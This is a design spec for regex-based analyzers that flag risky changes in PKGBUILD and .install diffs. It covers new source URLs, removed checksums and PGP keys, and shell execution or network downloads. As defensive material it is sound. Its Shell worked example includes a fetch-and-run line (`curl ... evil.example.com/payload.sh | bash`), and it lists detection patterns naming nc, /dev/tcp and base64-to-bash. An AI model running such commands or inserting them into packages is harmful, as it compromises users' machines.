# Analyzer Detection Specs

> Last updated: 2026-07-26
> Status: Active
> Companion docs: `risk-analysis.md` (severity tiers), `domain.md`
> § Finding, `sprints/s05-analyzers-policy.md` § Category Taxonomy,
> `internal/git/types.go` (`GitDiff`/`FileDiff`, source of truth for the
> structs referenced throughout this doc)

## Purpose

`interfaces.md` § Analyzer says each analyzer "should examine one aspect
of a package" but never specifies *how*. This doc is that specification
for the three analyzers built in Sprint 5 — URL, Checksum, Shell — so
their `Run` methods implement one shared, documented heuristic rather
than three independently-invented ones. It is the canonical source the
`TODO(sprint-5)` comments in `internal/analyzer/*.go` point back to.

None of these are real bash/PKGBUILD parsers. They are line- and
regex-based heuristics over unified-diff text. False positives and false
negatives are expected at the margins — see § Known Limitations. That's
an accepted tradeoff for Sprint 5, not a defect to silently work around
by over-fitting the regexes to one test fixture.

**Implementation note:** the array/scalar/function-body extraction
described below (§ URL Analyzer step 1-2, § Checksum Analyzer's array
lookups, § Shell Analyzer's function-body extraction) is implemented
once, in `internal/analyzer/pkgbuild.go` (`parsePKGBUILDDiff`,
`splitPatchLines`, `pkgbuildArray`/`pkgbuildScalar`/`pkgbuildFunction`),
not reimplemented separately in each of the three analyzer files. All
three PKGBUILD-touching analyzers call `parsePKGBUILDDiff` once and do
simple lookups over its structured output; only the shell analyzer's
.install scan and each analyzer's category-specific pattern matching
happen outside that shared parser. `internal/analyzer/pkgbuild_test.go`
covers the parser directly (table-driven, per
`sprint-plan.md`'s testing convention) so its behavior doesn't need to
be re-verified indirectly through each analyzer's own tests.

---

## Shared Conventions

### Input shape

Every analyzer receives `*git.GitDiff` (`internal/git/types.go`):

```go
type GitDiff struct {
    LocalCommit    string
    UpstreamCommit string
    Commits        []Commit
    Files          []FileDiff
}

type FileDiff struct {
    Path  string
    Kind  FileKind
    Patch string // unified diff text for this one file
}
```

Each analyzer selects the `FileDiff` it cares about from `diff.Files` by
`Kind` (never by matching `Path` against a literal filename string — Kind
is the authoritative classification per `types.go`'s own doc comment).
If no `FileDiff` of the required `Kind` is present, the analyzer returns
`(nil, nil)` — no findings, not an error; a package with no `.install`
file, for example, is not a Checksum-analyzer failure.

### Import case

When `diff.LocalCommit == ""` (first-time review, `workflow.md` § Import),
every `FileDiff.Patch` is fully additive — every content line is an Added
line, there are no Removed lines. No analyzer needs a special code path
for this: the same Added/Removed classification below already produces
the right result, since "new URL" / "new shell invocation" naturally
means "every URL / shell invocation in the file," which is correct for a
first review (nothing has been vetted yet).

### Line classification

Given a `FileDiff.Patch` (standard unified diff, as produced by
`git diff`), classify each line before scanning content:

| Line prefix | Classification | Handling |
| --- | --- | --- |
| `@@` | Hunk header | Skip; optionally parse `@@ -a,b +c,d @@` to track the new-file line number for `Finding.Location` |
| `+++` or `---` | File header | Skip |
| `+` (not `+++`) | Added | Strip the leading `+`; this is new content |
| `-` (not `---`) | Removed | Strip the leading `-`; this is prior content |
| anything else | Context | Unchanged line; ignored — analyzers only act on what changed |

### "Genuinely new" heuristic

A trimmed, whitespace-collapsed Added line counts as **new content**
only if the same normalized text does not also appear among that file's
Removed lines. This is what stops a pure reflow (reordering array
entries, rewrapping a long line) from being misread as a new URL or a
new shell command. All three analyzers apply this before emitting a
Finding for anything line-based (it does not apply to the positional
checksum-array comparison in § Checksum Analyzer, which is deliberately
position-aware instead).

### Finding fields

All three analyzers populate `domain.Finding` the same way:

- `Analyzer` — the producing analyzer's `Name()` (`"url"`, `"checksum"`,
  `"shell"`).
- `Category` — one of the seven strings from
  `s05-analyzers-policy.md` § Category Taxonomy. Never anything outside
  that table.
- `Summary` — one short human-readable line, e.g. `"New source URL:
  https://example.com/pkg-2.0.tar.gz"`.
- `Location` — `"<Path>:<line>"`, built by the shared `location(path
  string, line int) string` helper in `pkgbuild.go`. `line` comes from
  whichever construct the Finding is about:
  - **Array-derived findings** (`url_new`, `pgp_removed`,
    `checksum_removed`, `checksum_refresh`): from `pkgbuildEntry.Line` on
    the specific Added entry involved (the new URL, the SKIP
    substitution), or `pkgbuildArray.Line` (the array's own opening-line
    location) when no single entry is "the" location — e.g.
    `pgp_removed`, which is about an absence, not a specific entry.
  - **Scalar-derived findings** (`version_bump`): from
    `pkgbuildScalar.NewLine`.
  - **Function-derived findings** (`shell_exec`, `network_download`):
    from the specific `pkgbuildEntry.Line` in `Functions[].AddedLines`
    (or, for `.install`, the `patchLine.newLineNo` of the matching line
    directly — `.install` isn't parsed through the array/function
    structures, just scanned line by line).

  `line <= 0` means no new-file line number exists for that content —
  e.g. an array wholly deleted with nothing replacing it doesn't exist
  in the file being reviewed at all. `location()` degrades to the bare
  `Path` in that case rather than emitting a misleading `:0`.
- `Details` — left `nil`/empty for all three analyzers this sprint; no
  analyzer currently has evidence detailed enough to warrant it.

Note the deliberate asymmetry in `pkgbuild.go`'s types: `Added` fields
carry line numbers (`pkgbuildEntry`), `Removed` fields don't (plain
`string`). Removed content doesn't exist in the file being reviewed, so
a line number for it would have nothing to point at.

---

## URL Analyzer

**Target:** the `FileDiff` with `Kind == FileKindPKGBUILD`. Nothing else.

**Category produced:** `url_new` only.

### Algorithm

1. Locate the start of a `source` array: a line (Added or Context, since
   the array may already exist) matching

   ```text
   ^\s*source(_[A-Za-z0-9_]+)?\s*=\s*\(
   ```

   (matches `source=(`, `source_x86_64=(`, `source_aarch64=(`, etc. —
   PKGBUILD's architecture-suffixed array convention.)

2. From that line until the next unescaped `)` — tracking possible
   multi-line arrays where each subsequent line is another entry until
   the closing paren — collect every line belonging to that array block,
   preserving whether each was Added, Removed, or Context.

3. Within Added lines of the block, extract URL-like tokens matching:

   ```text
   [A-Za-z][A-Za-z0-9+.-]*://[^\s"')]+
   ```

   (covers `http://`, `https://`, `ftp://`, `git://`, `git+https://`,
   etc.)

4. For each extracted URL, apply the § Shared Conventions "genuinely
   new" check against the same array block's Removed-line URLs (extract
   URLs from Removed lines the same way). A URL that only moved position
   within the array, or was reformatted, does not count as new.

5. Emit one `Finding{Category: "url_new"}` per surviving URL.

### Worked example

```diff
-source=("https://example.org/pkg-1.9.tar.gz")
+source=("https://example.org/pkg-2.0.tar.gz")
```

→ one Finding: `url_new`, `"New source URL:
https://example.org/pkg-2.0.tar.gz"`. (The old URL is a Removed-line
match, not scanned for "new"-ness — only Added-line URLs are candidates.)

```diff
-source=("https://a.example.com/x.tar.gz"
-        "https://b.example.com/y.tar.gz")
+source=("https://b.example.com/y.tar.gz"
+        "https://a.example.com/x.tar.gz")
```

→ zero Findings. Both URLs appear in both Added and Removed sets — this
is a reorder, not a new source, and the "genuinely new" check filters it
out.

---

## Checksum Analyzer

**Target:** the same `FileDiff` (`Kind == FileKindPKGBUILD`).

**Categories produced:** `pgp_removed`, `checksum_removed`,
`checksum_refresh`, `version_bump` — up to one Finding of each category
per review; this analyzer does not emit duplicate Findings for the same
category within a single run.

### pgp_removed

1. Locate `validpgpkeys=(...)` the same way § URL Analyzer locates
   `source=(...)` (array-block extraction, same regex shape with
   `validpgpkeys` in place of `source`).
2. If the block has one or more Removed lines containing a key-looking
   token (`[0-9A-Fa-f]{8,}`, a PGP key ID/fingerprint) **and** the
   corresponding Added-line content for the block is either absent
   entirely (array deleted) or reduces to an empty array `()`, emit
   `Finding{Category: "pgp_removed"}`.
3. If Added lines still contain at least one key-looking token, do not
   emit — this is key rotation, not removal, and isn't a category this
   sprint's taxonomy covers (see § Known Limitations).

### checksum_removed / checksum_refresh

1. Locate every checksum array: `(md5|sha1|sha256|sha384|sha512|b2)sums
   (_[A-Za-z0-9_]+)?\s*=\s*\(`, arch-suffixed the same way `source` is.
2. Within one array block, take the ordered list of Removed entries and
   the ordered list of Added entries (array entries, not raw lines —
   split multi-line arrays into one string-literal-per-entry first).
   Compare **positionally** (index 0 old vs. index 0 new, etc.) — unlike
   the URL analyzer, checksum arrays are positionally coupled to the
   `source` array and reordering changes meaning, so no "genuinely new"
   line-presence check applies here.
3. For each position where the old entry was a real hash (matches
   `^[0-9a-fA-F]{32,128}$`, covering md5 through sha512/b2 lengths) and
   the new entry does **not** match that same pattern — whether it's the
   literal string `SKIP`, an empty string, or any other non-hash-shaped
   value — emit one `Finding{Category: "checksum_removed"}` referencing
   that array (one Finding per array touched this way, not one per
   entry — a PKGBUILD with three sources all losing verification in the
   same commit is one incident, not three). The trigger is "no longer
   hash-shaped," not "equals `SKIP` literally" — `SKIP` is the
   conventional makepkg idiom for this, but the actual risk is the loss
   of a verifiable hash, however it happens to be spelled.
4. Otherwise, if the array's Added entries differ from its Removed
   entries at all (position-by-position string inequality) and none of
   the changes match step 3's not-hash-shaped condition, emit one
   `Finding{Category: "checksum_refresh"}` for that array.
5. An array that is unchanged (Added == Removed positionally) produces
   no Finding from either category.

### version_bump

1. Match single-line assignments `^\s*pkgver\s*=\s*(.+)$` and
   `^\s*pkgrel\s*=\s*(.+)$` among Removed and Added lines (these are
   simple scalar assignments, not arrays — no block extraction needed).
   The value ends at a trailing bash comment: a `#` preceded by
   whitespace and outside quotes starts a comment and is dropped
   (`pkgver=1.2.3  # note` → `1.2.3`). A `#` inside a word or inside
   quotes is part of the value (`pkgver=1.2#3`, `pkgver='1.2 # x'`
   are unchanged). An assignment whose value is only a comment
   (`pkgrel= # set below`) is treated as having no value (#24).
2. If `pkgver` changed, changed value pair is captured, e.g. `12.4 →
   12.5`. If `pkgrel` changed (with or without a `pkgver` change),
   capture that pair too.
3. Emit **one** `Finding{Category: "version_bump"}` for the review if
   either changed, with `Summary` combining whichever changed, e.g.
   `"pkgver: 12.4 → 12.5"` or `"pkgver: 12.4 → 12.5, pkgrel: 1 → 2"`. Do
   not emit two separate Findings for a simultaneous pkgver+pkgrel bump.

### Worked example

```diff
-sha256sums=('a1b2c3...64hexchars...')
+sha256sums=('SKIP')
-pkgver=12.4
+pkgver=12.5
```

→ two Findings: `checksum_removed` (the array went from a real hash to
a non-hash-shaped value — here, `SKIP`) and `version_bump`
(`"pkgver: 12.4 → 12.5"`). Not `checksum_refresh` — step 3's
not-hash-shaped check takes priority over step 4's generic-change check
for the same array. An empty string (`''`) or any other non-hash value
in place of `SKIP` triggers the same `checksum_removed` classification.

```diff
-sha256sums=('a1b2...oldhash')
+sha256sums=('f9e8...newhash')
-pkgver=12.4
+pkgver=12.5
```

→ two Findings: `checksum_refresh` (real hash replaced by a different
real hash — normal version-bump housekeeping) and `version_bump`.

---

## Shell Analyzer

**Targets:** two different sources within the diff:

1. The `build()`, `package()`, and `prepare()` function bodies within the
   `FileDiff` with `Kind == FileKindPKGBUILD`.
2. The entire `FileDiff` with `Kind == FileKindInstall`, if present —
   `.install` scriptlets have no equivalent "function body" scoping to
   extract; the whole file is inspectable shell.

**Categories produced:** `shell_exec`, `network_download`. Both may be
emitted for the same line if it matches both pattern sets (e.g. `curl
... | bash` is simultaneously a download and a dynamic-code execution —
see worked example).

### Function-body extraction (PKGBUILD only)

1. Scan the patch for lines matching
   `^\s*(build|package|prepare)\s*\(\s*\)\s*\{` — a function start.
2. Collect lines until a line that is exactly `}` at the start of the
   line (column 0, standard `shfmt`/PKGBUILD convention) — this is a
   heuristic brace-matcher, not a real bash parser, and does not handle
   nested `{ }` blocks inside the function correctly (see § Known
   Limitations).
3. Only Added lines within this range are scan candidates — Context and
   Removed lines are not analyzed (an analyzer flags *new* risk, not
   pre-existing risk the reviewer already implicitly accepted in a prior
   approved review).

### Pattern sets

`network_download` — an Added line (within a PKGBUILD function body per
above, or anywhere in `.install`) matching any of:

```text
\bcurl\b
\bwget\b
\bgit\s+clone\b
\bnc\s+-
/dev/tcp/
```

`shell_exec` — an Added line (same scope) matching any of:

```text
\beval\b
\bbash\s+-c\b
\bsh\s+-c\b
^\s*source\s+\S+   # sourcing another script into the current shell
^\s*\.\s+\S+        # POSIX dot-sourcing, same as `source`
`[^`]+`            # backtick command substitution
\$\([^)]*\)        # $() command substitution
\|\s*(bash|sh)\b   # piping into a shell
base64\s+-d.*\|\s*(bash|sh)
```

The `$()`/backtick patterns are intentionally broad and will over-flag
common, benign PKGBUILD idioms (`$(uname -m)`, `$(basename "$srcdir")`).
This is a known, accepted false-positive source for Sprint 5 — see
§ Known Limitations — rather than an attempt at a real allowlist, which
would need a maintained list of "safe" command substitutions that's out
of scope for a first pass.

The `source`/dot-sourcing patterns carry an even higher false-positive
rate than `$()` in practice: sourcing a local helper script (e.g.
`source helper.sh` in `prepare()`) is one of the most common legitimate
PKGBUILD idioms, not a rare or suspicious one. It's still included
because sourcing pulls another file's contents into the current shell
for execution — a real risk vector, and one where the sourced file, if
new or changed, is independently visible in the Diff tab (as an "Other"
`FileKind`) for the reviewer to check. `source=(...)` (the PKGBUILD
array declaration, not the shell built-in) is not matched by this
pattern — the regex requires whitespace immediately after `source`,
which `source=(` never has.

### Worked example

```diff
 package() {
+  curl -s https://evil.example.com/payload.sh | bash
   install -Dm755 "$pkgname" "$pkgdir/usr/bin/$pkgname"
 }
```

→ two Findings on the same line: `network_download` (the `curl` match)
and `shell_exec` (the `| bash` match). Both are real risk signals and
both should surface — a reviewer benefits from seeing "this both fetches
something and immediately executes it" as two distinct flagged aspects,
not one collapsed Finding.

```diff
 build() {
-  make
+  make PREFIX="$(pkg-config --variable=prefix somepkg)"
 }
```

→ one Finding: `shell_exec`, from the `$()` pattern — a false positive
by any reasonable human judgment (this is ordinary `pkg-config` usage),
but consistent with the accepted heuristic tradeoff above.

---

## Known Limitations

Tracked here rather than silently worked around, per the project's
stated preference for flagged assumptions over silent scope creep:

- **No real bash tokenizer.** All three analyzers are regex/line-based.
  Multi-line array continuations, nested braces in function bodies, and
  quoting edge cases (escaped parens, nested quotes) are not fully
  handled and can produce both false positives and false negatives.
- **`$()`/backtick detection is intentionally broad** and will flag
  common benign PKGBUILD idioms as `shell_exec`. No allowlist exists yet.
  A future refinement pass could maintain one (e.g. `pkg-config`,
  `uname`, `basename`, `dirname` as known-safe command substitutions),
  but that's explicitly deferred, not attempted here.
- **`source`/dot-sourcing detection has an even higher false-positive
  rate** than `$()` — sourcing a local helper script is routine, not
  suspicious, in real PKGBUILDs. Included anyway because the sourced
  file's own diff is independently reviewable (as an "Other" `FileKind`
  in the Diff tab), so the Finding is a nudge to go check that file, not
  a claim that sourcing itself is wrong. Same "no allowlist yet"
  tradeoff as `$()` applies here.
- **PGP key rotation** (old key replaced by a different, still-present
  key) is not flagged by any current category — only full removal is.
  Whether key rotation deserves its own category is an open question for
  a future taxonomy revision.
- **Checksum positional comparison** assumes `source` and the checksum
  array stay index-aligned, which is the PKGBUILD convention but not
  enforced by anything — a PKGBUILD that reorders `source` without
  reordering its checksum array identically (a bug in the PKGBUILD
  itself, not in this analyzer) could produce a misleading
  `checksum_refresh`/`checksum_removed` classification.
- **Function-body brace matching** (`build()`/`package()`/`prepare()`)
  breaks on nested `{ }` (e.g. a `case` statement or a subshell block
  inside the function) — content after the first spurious `}` may be
  misclassified as outside the function.

None of these block Sprint 5's acceptance criteria, which require the
three categories to be *detectable* for the straightforward cases shown
in each § Worked example above — not a hardened, adversarially-robust
parser. Refinement is future work, not a Sprint 5 gate.

---

## Cross-References

- Category → Severity mapping is defined in `risk-analysis.md`,
  which is the canonical source for severity classification.
  This document specifies only analyzer detection behavior.
- `Finding` struct shape: `domain.md` § Finding.
- `GitDiff`/`FileDiff`/`FileKind`: `internal/git/types.go` (source of
  truth — if that file changes, this doc's field references need to be
  re-verified, not assumed still accurate).
